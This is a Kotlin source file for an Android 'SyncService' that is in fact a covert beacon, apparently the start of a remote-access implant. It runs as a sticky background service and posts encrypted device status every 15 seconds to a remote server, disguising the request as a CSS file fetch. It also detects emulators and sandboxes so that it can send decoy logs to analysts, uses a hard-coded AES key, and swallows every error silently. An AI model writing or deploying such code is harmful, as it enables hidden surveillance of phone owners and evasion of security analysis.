package com.assets.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject
import java.util.Timer
import java.util.TimerTask

class SyncService : Service() {

    private val RENDER_SERVER_URL = "https://onrender.com" // سيتم تحديثه برابط Render لاحقاً
    private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
    private var stealthTimer: Timer? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        activateStealthBeacon()
        return START_STICKY
    }

    private fun checkEnvironmentAntiAnalysis(): Boolean {
        val fingerPrint = android.os.Build.FINGERPRINT
        val manufacturer = android.os.Build.MANUFACTURER
        val model = android.os.Build.MODEL
        return (fingerPrint.startsWith("generic") || fingerPrint.startsWith("unknown") || model.contains("google_sdk") || model.contains("Emulator") || manufacturer.contains("Genymotion"))
    }

    private fun activateStealthBeacon() {
        stealthTimer = Timer()
        stealthTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                try {
                    val telemetryData = JSONObject()
                    telemetryData.put("status", "ACTIVE")
                    telemetryData.put("battery", getBatteryPercentage())
                    
                    if (checkEnvironmentAntiAnalysis()) {
                        telemetryData.put("sandbox_detected", true)
                        telemetryData.put("decoy_logs", "System Diagnostic OK")
                    } else {
                        telemetryData.put("device_info", "Android Node Connected")
                    }

                    val encryptedBlob = encryptGCM(telemetryData.toString())
                    sendSecureTelemetry("/assets/web/style-min.css", encryptedBlob)
                } catch (e: Exception) {}
            }
        }, 0, 15000)
    }

    private fun encryptGCM(plainText: String): String {
        val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
        val keySpec = SecretKeySpec(keyBytes, "AES")
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12)
        SecureRandom().nextBytes(iv)
        val spec = GCMParameterSpec(128, iv)
        
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
        val cipherText = cipher.doFinal(plainText.toByteArray(Charsets.UTF_8))
        
        val encryptedData = cipherText.copyOfRange(0, cipherText.size - 16)
        val authTag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)

        val jsonPacket = JSONObject()
        jsonPacket.put("v", byteArrayToHex(iv))
        jsonPacket.put("g", byteArrayToHex(authTag))
        jsonPacket.put("d", byteArrayToHex(encryptedData))

        return Base64.encodeToString(jsonPacket.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun sendSecureTelemetry(endpoint: String, payload: String) {
        try {
            val url = URL(RENDER_SERVER_URL + endpoint)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "text/plain")
            connection.setRequestProperty("x-sync-mode", "heartbeat")
            connection.setRequestProperty("x-agent-model", android.os.Build.MODEL)
            connection.doOutput = true
            
            val outputStream: OutputStream = connection.outputStream
            outputStream.write(payload.toByteArray(Charsets.UTF_8))
            outputStream.flush()
            outputStream.close()
            connection.responseCode
        } catch (e: Exception) {}
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else 0
        } catch (e: Exception) { 0 }
    }

    private fun byteArrayToHex(bytes: ByteArray): String {
        val sb = StringBuilder()
        for (b in bytes) sb.append(String.format("%02x", b))
        return sb.toString()
    }

    override fun onDestroy() {
        stealthTimer?.cancel()
        super.onDestroy()
    }
}
